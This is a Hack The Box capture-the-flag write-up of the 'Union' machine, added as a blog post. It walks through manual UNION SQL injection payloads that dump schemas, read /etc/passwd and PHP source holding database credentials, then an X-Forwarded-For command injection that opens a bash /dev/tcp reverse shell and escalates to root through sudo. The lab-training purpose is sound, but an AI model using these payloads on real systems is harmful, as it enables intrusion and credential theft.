@@ -1,0 +1,399 @@
+---
+title: Union Writeup - Hack The Box
+description: Exploiting UNION-based SQL injection for data extraction and credential discovery, then leveraging command injection via HTTP headers for privilege escalation
+author: Nontas Bakoulas
+date: 2025-10-14
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+Let's start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local:~$ nmap -sVC 10.129.96.75
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-14 14:37 EEST
+Nmap scan report for 10.129.96.75
+Host is up (0.055s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.24 seconds
+```
+
+Visiting the website, we see a "Player Eligibility Check" form: 
+
+![Player eligibility form](/images/blog/union/IMG-20251014144457475.png)
+
+When submitting any name, we see the following: 
+
+![Form submission result](/images/blog/union/IMG-20251014144620166.png)
+
+The `/challenge` path asks us for a flag. No matter what we put in there, we just get the same page back with no success/error message: 
+
+![Challenge page](/images/blog/union/IMG-20251014144848046.png)
+
+Fuzzing for directories and `.php` files with `ffuf`, we find the following:
+```console title="Directory fuzzing"
+nontas@local:~$ ffuf -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.129.96.75/FUZZ -e .php -ic
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.96.75/FUZZ
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions       : .php
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 200, Size: 1220, Words: 158, Lines: 43, Duration: 64ms]
+index.php               [Status: 200, Size: 1220, Words: 158, Lines: 43, Duration: 83ms]
+css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 78ms]
+firewall.php            [Status: 200, Size: 13, Words: 2, Lines: 1, Duration: 100ms]
+config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 94ms]
+challenge.php           [Status: 200, Size: 772, Words: 48, Lines: 21, Duration: 78ms]
+```
+
+Visiting `/config.php` we get an empty page, while `/firewall.php` responds with `200` but shows "Access Denied". 
+### SQL Injection
+Unfortunately, `SQLMap` is unusuable on this box due to a WAF, so we have to go the manual way.
+
+As part of our tests, we try the classic `admin' or 1=1;-- - `: 
+
+![SQL injection test](/images/blog/union/IMG-20251014145919290.png)
+
+As we can see, it doesn't show the message "Complete the challenge *here*", which is quite odd. Probably something to do with the WAF.
+
+Submitting a name that **exists** on the database returns a different message: 
+
+![Database entry found](/images/blog/union/IMG-20251014150739749.png)
+
+Changing the payload to `ippsec'` returns the old "Eligible" message, meaning the form is either **not** SQL injectable, or it's throwing an error and treating the user as not being in the DB.
+
+Since we know `ippsec` is in the database, we can try crafting a request that will return the "not eligible" message, while also injecting successfully.
+
+We can probably guess that the SQL query is the following:
+```sql
+SELECT username FROM users WHERE username = '<username>';
+```
+
+So we can inject the above with `ippsec';-- -`: 
+
+![Successful injection](/images/blog/union/IMG-20251014151545315.png)
+
+We've successfully injected since the response doesn't show `ippsec';-- -`.
+
+#### Union Injection
+Testing `ippsec' UNION SELECT 1;-- -`, we see that we're successful: 
+
+![Union injection test](/images/blog/union/IMG-20251014152522121.png)
+
+We probably have 2 rows in the response. The first one is the player `ippsec`, and the second one has `1`.
+
+To extract data, we need to return a single row (the one from the `UNION` statement). We can do this by simply changing the name to a user that doesn't exist in the DB (like an empty string): 
+
+![Single row extraction](/images/blog/union/IMG-20251014152732828.png)
+
+We see `1` back to us, so we can start enumerating the DB:
+
+Since we can only see the result of the 1st row, we'll use `group_concat()`.
+
+First, list the databases:
+```sql
+' UNION SELECT group_concat(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA;-- -
+```
+and we get `mysql,information_schema,performance_schema,sys,november`. The only non-default DB here is `november`.
+
+List tables inside `november`:
+```sql
+' UNION SELECT group_concat(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='november';-- -
+```
+we get the tables `flag,players`.
+
+List columns in each table:
+```sql
+' UNION SELECT group_concat(TABLE_NAME, ':', COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='november';-- -
+```
+there's only 1 column in each table: `flag:one,players:player`.
+
+Finally, get the flag (Table: `flag`, column: `one`):
+```sql
+' UNION SELECT group_concat(one) FROM flag;-- -
+```
+
+The flag is `UHC{F1rst_5tep_2_Qualify}`.
+
+Now we can use the flag on `/challenge.php`: 
+
+![Flag submission](/images/blog/union/IMG-20251014154933112.png)
+
+It redirected us to `/firewall.php` with the above message.
+
+Making a quick `nmap` scan at port `22`, we do see SSH available:
+```console title="SSH port scan"
+nontas@local:~$ nmap -sVC -p 22 10.129.96.75
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-14 15:50 EEST
+Nmap scan report for 10.129.96.75
+Host is up (0.054s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
+|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
+|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 2.56 seconds
+```
+
+## Initial Foothold
+Since we don't have any credentials, we'll:
+1. Check our privileges and
+2. Attempt to read files via the SQL Union injection
+
+To check our privileges, we run the following in order:
+```sql
+' UNION SELECT user();-- -
+' UNION SELECT super_priv FROM mysql.user;-- -
+' UNION SELECT group_concat(privilege_type) FROM information_schema.user_privileges WHERE grantee="'uhc'@'localhost'";-- -
+```
+- `uhc@localhost`
+- `Y` (we have superuser privileges)
+- `FILE` among many others
+
+So we probably have privileges to read files.
+
+Let's attempt to read `/etc/passwd`:
+```sql
+' UNION SELECT LOAD_FILE("/etc/passwd");-- -
+```
+
+We're successful:
+```console
+root:x:0:0:root:/root:/bin/bash
+<SNIP>
+htb:x:1000:1000:htb:/home/htb:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
+uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
+```
+The interesting users are `root`, `htb` and `uhc`.
+
+Let's grab the source code of the `.php` files:
+
+- First, `firewall.php`:
+```sql
+' UNION SELECT LOAD_FILE("/var/www/html/firewall.php");-- -
+```
+
+```php title="firewall.php"
+<?php
+require('config.php');
+
+if (!($_SESSION['Authenticated'])) {
+  echo "Access Denied";
+  exit;
+}
+
+?>
+<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<!------ Include the above in your HEAD tag ---------->
+
+<div class="container">
+    <h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>
+
+</div>
+<section class="bg-dark text-center p-5 mt-4">
+    <div class="container p-5">
+<?php
+  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+  } else {
+    $ip = $_SERVER['REMOTE_ADDR'];
+  };
+  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
+?>
+        <h1 class="text-white">Welcome Back!</h1>
+        <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
+    </div>
+</section>
+</div>
+```
+
+- `index.php`:
+```php title="index.php"
+<?php
+  require('config.php');
+  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {
+
+	$player = strtolower($_POST['player']);
+
+	// SQLMap Killer
+	$badwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
+	foreach ($badwords as $badword) {
+		if (preg_match( $badword, $player )) {
+			echo 'Congratulations ' . $player . ' you may compete in this tournament!';
+			die();
+		}
+	}
+
+	$sql = "SELECT player FROM players WHERE player = '" . $player . "';";
+	$result = mysqli_query($conn, $sql);
+	$row = mysqli_fetch_array( $result, MYSQLI_ASSOC);
+	if ($row) {
+		echo 'Sorry, ' . $row['player'] . " you are not eligible due to already qualifying.";
+	} else {
+		echo 'Congratulations ' . $player . ' you may compete in this tournament!';
+		echo '<br />';
+		echo '<br />';
+		echo 'Complete the challenge <a href="/challenge.php">here</a>';
+	}
+	exit;
+  }
+?>
+
+<SNIP>
+```
+
+The credentials are probably inside `config.php`:
+```php title="config.php"
+<?php
+  session_start();
+  $servername = "127.0.0.1";
+  $username = "uhc";
+  $password = "uhc-11qual-global-pw";
+  $dbname = "november";
+
+  $conn = new mysqli($servername, $username, $password, $dbname);
+?>
+```
+
+We found the credentials `uhc:uhc-11qual-global-pw`
+
+`SSH` into the server using them:
+```console title="SSH login"
+nontas@local:~$ ssh uhc@10.129.96.75
+<SNIP>
+uhc@10.129.96.75's password:
+<SNIP>
+uhc@union:~$ cat user.txt
+```
+
+And get the user flag.
+
+## Privilege Escalation
+Looking back at `firewall.php`, we see the following code snippet:
+```php
+<?php
+  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+  } else {
+    $ip = $_SERVER['REMOTE_ADDR'];
+  };
+  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
+?>
+```
+
+It runs `iptables` with `sudo`. Even though we cannot control our remote address, what we can control is the HTTP header `X-Forwarded-For`.
+
+### Command Injection
+I'll replay the request and add the `X-Forwarded-For` header myself:
+```http
+GET /firewall.php HTTP/1.1
+Host: 10.129.96.75
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.129.96.75/challenge.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,el;q=0.8
+Cookie: PHPSESSID=5mophu89n3f71s835k6e6qbnj8
+X-Forwarded-For: 1.1.1.1; ping -c 1 10.10.14.78;
+```
+
+And locally start a listener:
+```console title="ICMP listener"
+nontas@local:~$ sudo tcpdump -ni tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+16:30:49.529385 IP 10.129.96.75 > 10.10.14.78: ICMP echo request, id 2, seq 1, length 64
+16:30:49.529396 IP 10.10.14.78 > 10.129.96.75: ICMP echo reply, id 2, seq 1, length 64
+```
+
+The `ping` command ran successfully, so we can now attempt to start a reverse shell.
+
+Change the header to the following:
+```http
+GET /firewall.php HTTP/1.1
+X-Forwarded-For: 1.1.1.1; bash -c "bash -i >& /dev/tcp/10.10.14.78/1234 0>&1";
+```
+
+And start a `nc` listener:
+```console title="Reverse shell"
+nontas@local:~$ nc -lnvp 1234
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.129.96.75.
+Ncat: Connection from 10.129.96.75:41246.
+bash: cannot set terminal process group (874): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@union:~/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+We got a connection, so upgrade the shell first:
+```console title="Shell upgrade"
+www-data@union:~/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@union:~/html$ ^Z
+[1]  + 25668 suspended  nc -lnvp 1234
+[Oct 14, 2025 - 17:25:34 (EEST)] nontas@local:~$ stty raw -echo;fg
+[1]  + 25668 continued  nc -lnvp 1234
+
+www-data@union:~/html$
+```
+
+Listing the `sudo` privileges, we can see that `www-data` can run **any** command as `sudo`:
+```console title="Sudo privileges"
+www-data@union:~/html$ sudo -l
+Matching Defaults entries for www-data on union:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on union:
+    (ALL : ALL) NOPASSWD: ALL
+```
+
+So just spawn a new shell as root:
+```console title="Root access"
+www-data@union:~/html$ sudo bash
+root@union:~# cat root.txt
+```
+
+We have successfully completed **Union**!
